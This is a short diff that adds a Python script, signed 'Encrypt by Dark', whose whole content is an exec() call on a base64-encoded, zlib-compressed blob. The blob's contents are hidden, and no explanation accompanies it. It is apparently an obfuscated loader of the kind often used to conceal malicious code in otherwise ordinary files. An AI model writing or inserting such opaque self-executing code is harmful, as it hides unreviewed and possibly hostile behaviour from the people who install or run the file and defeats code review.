@@ -1,0 +1,3 @@
+#Encrypt by Dark
+import marshal,zlib,base64
+exec(zlib.decompress(base64.b64decode("eJx1j81qhTAQRveC7zBcCGqxxlvuogjSTd+ilJKYaALmh8mI+PaN5ZZyF53VMAPn+451MSDBvmhqIaSyCKlLRyLt6godPOMM1y4eVfP/B8pC6RmkwK9pSxRcPW2I2mcgBRJrC7tVZMbXvhnKAvJEtJ7qy3vY/RqEsn4ZgCnG4IMp4Hn9BHmQThdg8AvL9x8aPMG171t4zGhyv9OhU3dmXRmimAbOF0tmk90UHDda2duNz6g1l2uQ3Anr+WnxhmIfCTddtafI+CfzKB4PMsG/3M2/AdFXZpg=")))
